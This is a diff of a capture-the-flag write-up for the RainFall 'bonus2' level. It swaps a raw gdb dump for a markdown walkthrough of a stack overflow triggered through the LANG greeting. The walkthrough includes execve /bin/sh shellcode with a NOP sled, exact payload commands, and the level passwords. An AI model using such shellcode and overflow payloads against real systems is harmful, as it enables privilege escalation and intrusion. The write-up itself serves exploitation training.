@@ -1,79 +1,225 @@
-su bonus2 
-579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+# Bonus2 — Environment Variable + Stack Overflow
 
-gdb ./bonus2
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
-(gdb) disas main
-Dump of assembler code for function main:
-   0x08048529 <+0>:	push   %ebp
-   0x0804852a <+1>:	mov    %esp,%ebp
-   0x0804852c <+3>:	push   %edi
-   0x0804852d <+4>:	push   %esi
-   0x0804852e <+5>:	push   %ebx
-   0x0804852f <+6>:	and    $0xfffffff0,%esp
-   0x08048532 <+9>:	sub    $0xa0,%esp
-   0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
-   0x0804853c <+19>:	je     0x8048548 <main+31>
-   0x0804853e <+21>:	mov    $0x1,%eax
-   0x08048543 <+26>:	jmp    0x8048630 <main+263>
-   0x08048548 <+31>:	lea    0x50(%esp),%ebx
-   0x0804854c <+35>:	mov    $0x0,%eax
-   0x08048551 <+40>:	mov    $0x13,%edx
-   0x08048556 <+45>:	mov    %ebx,%edi
-   0x08048558 <+47>:	mov    %edx,%ecx
-   0x0804855a <+49>:	rep stos %eax,%es:(%edi)
-   0x0804855c <+51>:	mov    0xc(%ebp),%eax
-   0x0804855f <+54>:	add    $0x4,%eax
-   0x08048562 <+57>:	mov    (%eax),%eax
-   0x08048564 <+59>:	movl   $0x28,0x8(%esp)
-   0x0804856c <+67>:	mov    %eax,0x4(%esp)
-   0x08048570 <+71>:	lea    0x50(%esp),%eax
-   0x08048574 <+75>:	mov    %eax,(%esp)
-   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
-   0x0804857c <+83>:	mov    0xc(%ebp),%eax
-   0x0804857f <+86>:	add    $0x8,%eax
-   0x08048582 <+89>:	mov    (%eax),%eax
-   0x08048584 <+91>:	movl   $0x20,0x8(%esp)
-   0x0804858c <+99>:	mov    %eax,0x4(%esp)
-   0x08048590 <+103>:	lea    0x50(%esp),%eax
-   0x08048594 <+107>:	add    $0x28,%eax
-   0x08048597 <+110>:	mov    %eax,(%esp)
-   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
-   0x0804859f <+118>:	movl   $0x8048738,(%esp)
-   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
-   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
-   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)
-   0x080485ba <+145>:	je     0x8048618 <main+239>
-   0x080485bc <+147>:	movl   $0x2,0x8(%esp)
-   0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
-   0x080485cc <+163>:	mov    0x9c(%esp),%eax
-   0x080485d3 <+170>:	mov    %eax,(%esp)
-   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
-   0x080485db <+178>:	test   %eax,%eax
-   0x080485dd <+180>:	jne    0x80485eb <main+194>
-   0x080485df <+182>:	movl   $0x1,0x8049988
-   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
-   0x080485eb <+194>:	movl   $0x2,0x8(%esp)
-   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
-   0x080485fb <+210>:	mov    0x9c(%esp),%eax
-   0x08048602 <+217>:	mov    %eax,(%esp)
-   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
----Type <return> to continue, or q <return> to quit---
+## Overview
 
-bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
-bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
-Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+This level combines:
+
+* **Stack buffer overflow**
+* **Environment variable control**
+* **Different execution paths depending on LANG**
+
+Goal:
+
+```text
+Execute shellcode → get next password
+```
+
+---
+
+## 1. Program Behavior
+
+The program takes **two arguments**:
+
+```bash
+./bonus2 <arg1> <arg2>
+```
+
+### Internal behavior:
+
+1. Copies:
+
+   * `argv[1]` → max **40 bytes**
+   * `argv[2]` → max **32 bytes**, placed after argv[1]
+
+2. Checks environment variable:
+
+```c
+LANG
+```
+
+3. Depending on LANG:
+
+   * `"fi"` → Finnish message
+   * `"nl"` → Dutch message
+   * otherwise → English
+
+4. Calls:
+
+```c
+greetuser(buffer)
+```
+
+---
+
+## 2. Vulnerability
+
+Inside `greetuser()`:
+
+```c
+char buf[64];
+
+strcpy(buf, greeting);
+strcat(buf, user_input);
+```
+
+❌ No bounds check
+
+---
+
+## 3. Important Detail (LANG Impact)
+
+Greeting length changes:
+
+| LANG | Message       | Effect                  |
+| ---- | ------------- | ----------------------- |
+| none | "Hello "      | too small → no overflow |
+| fi   | longer string | overflow possible       |
+| nl   | even longer   | easier overflow         |
+
+---
+
+## 4. Finding Offset
+
+Using pattern:
+
+### LANG = nl
+
+```bash
+(gdb) run $(python -c 'print "A"*40') PATTERN
+```
+
+Crash:
+
+```text
+EIP = 0x38614137
+offset = 23
+```
+
+---
+
+### LANG = fi
+
+```text
+offset = 18
+```
+
+---
+
+## 5. Exploit Strategy
+
+1. Put **shellcode in environment variable (LANG)**
+2. Use long greeting → overflow buffer
+3. Overwrite return address
+4. Jump into shellcode (NOP sled)
+
+---
+
+## 6. Shellcode
+
+```bash
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68
+\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+```
+
+---
+
+## 7. Prepare Environment
+
+```bash
+export LANG=$(python -c 'print("nl" + "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+```
+
+* `"nl"` → trigger long greeting
+* `NOP sled` → safer landing
+* shellcode at the end
+
+---
+
+## 8. Find Shellcode Address
+
+In GDB:
+
+```bash
+(gdb) b *main+125
+(gdb) run $(python -c 'print "A"*40') test
+(gdb) x/20s *((char**)environ)
+```
+
+Example:
+
+```text
+0xbffffeb4
+```
+
+Add offset to land inside NOP:
+
+```text
+0xbffffeb4 + 50 = 0xbffffee6
+```
+
+---
+
+## 9. Payload
+
+### With LANG = nl
+
+```bash
+./bonus2 \
+$(python -c 'print "A" * 40') \
+$(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
+```
+
+---
+
+### With LANG = fi
+
+```bash
+./bonus2 \
+$(python -c 'print "A" * 40') \
+$(python -c 'print "B" * 18 + "\xe6\xfe\xff\xbf"')
+```
+
+---
+
+## 10. Execution
+
+Example:
+
+```bash
+Goedemiddag! AAAAA...BBBBB...
+$ whoami
+bonus3
+```
+
+---
+
+## 11. Result
+
+```bash
 $ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
 
+---
+
+## 12. Why It Works
+
+* `strcpy + strcat` → unsafe
+* Buffer only 64 bytes
+* Greeting length increases overflow size
+* Environment variables store shellcode
+* Return address hijacked → jump to shellcode
+
+---
+
+## 13. Key Takeaways
+
+* Environment variables are powerful attack vectors
+* Buffer size + string length = critical
+* Same code → different behavior based on inputs
+* NOP sled improves reliability
+
+---
 
 
 
